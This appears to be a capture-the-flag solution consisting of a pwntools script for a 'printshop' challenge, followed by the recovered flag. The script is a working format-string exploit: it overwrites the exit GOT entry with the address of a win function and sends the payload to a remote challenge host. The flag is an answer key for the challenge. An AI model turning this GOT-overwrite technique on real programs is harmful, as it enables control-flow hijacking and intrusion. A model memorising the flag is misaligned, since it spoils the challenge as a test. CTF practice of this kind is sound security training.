# solver.py

```py
from pwn import *

binary = './printshop'

e = context.binary = ELF(binary)
r = ROP(e)

r = remote('chal.pctf.competitivecyber.club', 7997)
# r = process('./printshop')

payload_writes = {
    e.got['exit']: e.sym['win']
}

r.recvuntil(b'>> ')

payload = fmtstr_payload(6, payload_writes, write_size='short')
r.sendline(payload)

r.recv()
r.recv()
print(r.recv())
```

# FLAG

**`PCTF{b4by_f0rm4t_wr1t3_6344792}`**




